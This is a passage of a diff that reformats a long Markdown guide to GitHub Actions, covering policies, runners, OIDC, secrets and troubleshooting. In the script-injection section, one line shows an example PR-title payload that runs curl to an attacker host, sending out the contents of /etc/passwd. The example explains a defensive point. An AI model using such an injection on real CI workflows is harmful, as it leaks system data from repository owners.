 Thanks to @user1 for registry support and @user2 for performance improvements!
-````
+```
 
 ---
 
@@ -8800,7 +8819,7 @@ jobs:
 
 **Access Control:**
 
-```
+```text
 Settings > Actions > Access:
 - Accessible to: All repositories
 - Or specific repositories
@@ -8844,7 +8863,7 @@ runs:
 
 **Consumer Discovery:**
 
-```
+```text
 GitHub.com/marketplace
 Browse "Actions" category
 Search for your action name
@@ -8876,7 +8895,7 @@ Click to view details, installation code
 
 **Policies:**
 
-```
+```text
 Organization Private Marketplace:
 - Control which actions are approved for use
 - Force specific versions (e.g., only v2.0.0+)
@@ -8887,7 +8906,7 @@ Organization Private Marketplace:
 
 **Consumer Experience:**
 
-```
+```text
 When creating new workflow:
 - "New workflow" → "Use a public marketplace action"
 - Only shows private marketplace + approved public actions
@@ -8930,7 +8949,7 @@ When creating new workflow:
 
 #### Migration Path Example
 
-```
+```text
 Phase 1: Development
 ┌─────────────────────┐
 │ Private Repository  │ (Team develops)
@@ -9305,7 +9324,7 @@ sudo ./svc.sh start
 
 **The GitHub UI provides specific token and setup instructions:**
 
-```
+```text
 Repository Settings > Actions > Runners > New self-hosted runner
 
 1. Select Operating System (Linux, Windows, macOS)
@@ -9568,7 +9587,7 @@ Organization and enterprise admins can restrict which actions and reusable workf
 
 **Allow-list patterns:**
 
-```
+```text
 # Allow all verified creator actions
 actions/*
 github/*
@@ -9599,7 +9618,7 @@ In org settings you can require that first-time contributors have their workflow
 
 **Enterprise policies override org policies:**
 
-```
+```text
 Enterprise admin → can restrict org admins from changing policies
 Org admin        → can set policies within enterprise-allowed bounds
 Repo admin       → can set policies within org-allowed bounds
@@ -9609,7 +9628,7 @@ Repo admin       → can set policies within org-allowed bounds
 
 Enterprise admins can enforce that specific reusable workflows run on all repositories matching a filter, regardless of the repository workflow configuration:
 
-```
+```text
 Enterprise Settings → Policies → Required workflows
 → Add workflow: org/compliance-workflows/.github/workflows/scan.yml@main
 → Apply to: all repositories in selected organizations
@@ -9647,7 +9666,7 @@ Organization Settings → Actions → General → Fork pull request workflows
 
 For **enterprise-level** enforcement:
 
-```
+```text
 Enterprise Settings → Policies → Actions → Fork pull request workflows
 → Enforce one of the approval options across all organizations
 ```
@@ -9678,7 +9697,7 @@ jobs:
 
 For public repositories with CI triggered by fork PRs, restrict which actions the workflow can use via the organization policy:
 
-```
+```text
 Organization → Settings → Actions → General → Policies
 → "Allow select actions and reusable workflows"
 → Add only verified/trusted actions to the allow list
@@ -9732,7 +9751,7 @@ jobs:
 
 GitHub-hosted runners use a range of dynamic IP addresses. For services that lock down inbound traffic, you have several options:
 
-**Option A: Retrieve GitHub-hosted runner IPs and add to your allow list**
+**Option A:** Retrieve GitHub-hosted runner IPs and add to your allow list
 
 ```bash
 # Get current GitHub Actions IP ranges (changes frequently)
@@ -9741,7 +9760,7 @@ curl https://api.github.com/meta | jq '.actions'
 
 > Note: IP ranges change frequently. GitHub provides webhooks (`meta` event) to notify when the list changes.
 
-**Option B: Use a self-hosted runner inside your network perimeter**
+**Option B:** Use a self-hosted runner inside your network perimeter
 
 Self-hosted runners run on infrastructure you control, so the source IP is predictable:
 
@@ -9753,7 +9772,7 @@ jobs:
       - run: curl https://internal.company.com/api/deploy
 ```
 
-**Option C: GitHub Enterprise Cloud — IP allow list integration**
+**Option C:** GitHub Enterprise Cloud — IP allow list integration
 
 Enterprise Cloud customers can enable the "GitHub Actions" entry in the organization's IP allow list. This automatically allows traffic from GitHub-hosted runner IPs without manual maintenance.
 
@@ -9907,7 +9926,7 @@ GitHub provides a three-tier hierarchy for secrets and variables, with more spec
 
 **Hierarchy (most specific wins):**
 
-```
+```text
 Enterprise → Organization → Repository → Environment
 ```
 
@@ -10250,7 +10269,7 @@ Security is a first-class concern in GitHub Actions. In addition to correctly ma
 
 **Lifecycle:**
 
-```
+```text
 Job starts → GITHUB_TOKEN created (scoped to the repo, job lifetime)
 Job ends   → GITHUB_TOKEN revoked automatically
 ```
@@ -10319,7 +10338,7 @@ OpenID Connect (OIDC) allows workflows to obtain short-lived credentials from cl
 
 **How it works:**
 
-```
+```text
 1. Workflow requests an OIDC JWT from GitHub (requires id-token: write)
 2. GitHub signs the JWT with its OIDC provider keys
 3. Cloud provider validates the JWT against GitHub's OIDC discovery endpoint
@@ -10534,7 +10553,7 @@ jobs:
 
 The subject claim format matters for trust policy enforcement:
 
-```
+```text
 Format: repo:ORG/REPO:ref:refs/heads/BRANCH
 Example: repo:myorg/myapp:ref:refs/heads/main
 
@@ -10695,7 +10714,7 @@ Script injection occurs when untrusted user-controlled data (e.g., PR titles, is
 
 An attacker could submit a PR with a title like:
 
-```
+```text
 My PR"; curl https://attacker.com/exfil?data=$(cat /etc/passwd); echo "
 ```
 
@@ -10948,7 +10967,7 @@ permissions:
 - `github/super-linter`
 - Established language tool setup actions
 
-**Alternative: Custom Action Policy**
+#### Alternative: Custom Action Policy
 
 For ultra-secure environments, consider writing custom actions instead of using Marketplace:
 
@@ -11165,17 +11184,17 @@ The `GITHUB_RETENTION_DAYS` environment variable in a running workflow reflects 
 
 #### Problem: Permission Denied
 
-```
+```text
 fatal: could not read Username for 'https://github.com': No such file or directory
 ```
 
-#### Causes:
+#### Causes — Authentication Errors
 
 - Missing or invalid GitHub token
 - SSH key not configured for self-hosted runners
 - GITHUB_TOKEN doesn't have sufficient permissions
 
-#### Solutions:
+#### Solutions — Authentication Errors
 
 **Using GITHUB_TOKEN (automatically provided):**
 
@@ -11207,18 +11226,18 @@ fatal: could not read Username for 'https://github.com': No such file or directo
 
 #### Problem: `npm ci` fails with version conflicts
 
-```
+```text
 npm ERR! code ERESOLVE
 npm ERR! ERESOLVE could not resolve dependencies
 ```
 
-#### Causes:
+#### Causes — Dependency Installation
 
 - Node.js version mismatch
 - Lock file out of sync with package.json
 - Conflicting peer dependencies
 
-#### Solutions:
+#### Solutions — Dependency Installation
 
 **Ensure Node.js version matches development environment:**
 
@@ -11255,14 +11274,14 @@ npm ci --legacy-peer-deps
 The operation timed out because it took longer than 360 minutes
 ```
 
-#### Causes:
+#### Causes — Job Timeout
 
 - Long-running tests
 - Network connectivity issues
 - Waiting on external resources
 - Infinite loops in workflow logic
 
-#### Solutions:
+#### Solutions — Job Timeout
 
 **Set appropriate timeout:**
 
@@ -11299,18 +11318,18 @@ jobs:
 
 #### Problem: Workflow doesn't trigger or shows validation error
 
-```
+```text
 Invalid workflow file at .github/workflows/main.yml: mapping values are not allowed in this context
 ```
 
-#### Causes:
+#### Causes — Workflow Syntax Errors
 
 - Invalid YAML syntax
 - Incorrect indentation
 - Unclosed quotation marks
 - Invalid context expressions
 
-#### Solutions:
+#### Solutions — Workflow Syntax Errors
 
 **Validate YAML syntax:** Use an online YAML validator or VS Code extension
 
@@ -11344,17 +11363,17 @@ jobs:
 
 #### Problem: `ubuntu-latest` runner has outdated software
 
-```
+```text
 The requested image with tag is not available
 ```
 
-#### Causes:
+#### Causes — Runner Outdated Software
 
 - Using outdated runner images
 - Self-hosted runner issues
 - GitHub Hosted runner image update lag
 
-#### Solutions:
+#### Solutions — Runner Outdated Software
 
 **Use specific runner versions:**
 
@@ -11481,13 +11500,13 @@ sudo usermod -aG docker runner_user
 An error occurred when trying to download an artifact using the provided path
 ```
 
-#### Causes:
+#### Causes — Artifact Download
 
 - Artifact upload failed silently
 - Artifact deleted before download
 - Job didn't run (skipped due to `if:` condition)
 
-#### Solutions:
+#### Solutions — Artifact Download
 
 **Ensure artifact is uploaded:**
 
@@ -11527,12 +11546,12 @@ An error occurred when trying to download an artifact using the provided path
 Error building for node@16 with os@ubuntu
 ```
 
-#### Causes:
+#### Causes — Matrix Build
 
 - `fail-fast: true` (default behavior)
 - One combination has specific issue
 
-#### Solutions:
+#### Solutions — Matrix Build
 
 **Run all combinations even if one fails:**
 
@@ -11566,14 +11585,14 @@ strategy:
 Error: DEPLOY_TOKEN is not recognized
 ```
 
-#### Causes:
+#### Causes — Secret Management
 
 - Secret name doesn't match
 - Secret not added to repository
 - Using wrong context syntax
 - Scope issues for organization secrets
 
-#### Solutions:
+#### Solutions — Secret Management
 
 **Correct usage:**
 
@@ -11614,13 +11633,13 @@ env:
 echo ${{ steps.build.outputs.result }}  Returns empty string
 ```
 
-#### Causes:
+#### Causes — Step Output
 
 - Step doesn't have an `id` assigned
 - Output not properly written to GITHUB_OUTPUT
 - Step was skipped
 
-#### Solutions:
+#### Solutions — Step Output
 
 **Properly set step outputs:**
 
@@ -11648,7 +11667,7 @@ echo ${{ steps.build.outputs.result }}  Returns empty string
 Workflow taking 30+ minutes for simple tasks
 ```
 
-#### Causes:
+#### Causes — Performance
 
 - Jobs running sequentially unnecessarily
 - Large dependencies being installed repeatedly
@@ -11656,7 +11675,7 @@ Workflow taking 30+ minutes for simple tasks
 - Overly large matrix configurations
 - Redundant workflow runs not cancelled when new commits push
 
-#### Solutions: Parallelization
+#### Solutions — Performance
 
 **Use a fan-out / fan-in pattern to maximize parallel execution:**
 
@@ -11866,13 +11885,13 @@ jobs:
 denied: requested access to the resource is denied
 ```
 
-#### Causes:
+#### Causes — Docker Push
 
 - Authentication not configured
 - Missing permissions for registry
 - Tag format incorrect
 
-#### Solutions:
+#### Solutions — Docker Push
 
 **Authenticate with Docker registry:**
 
@@ -11912,13 +11931,13 @@ denied: requested access to the resource is denied
 Workflow succeeds but no Slack message sent
 ```
 
-#### Causes:
+#### Causes — Notification Failure
 
 - Webhook URL incorrect or expired
 - Step only runs on success
 - Missing error handling
 
-#### Solutions:
+#### Solutions — Notification Failure
 
 **Enable notifications on all job states:**
 
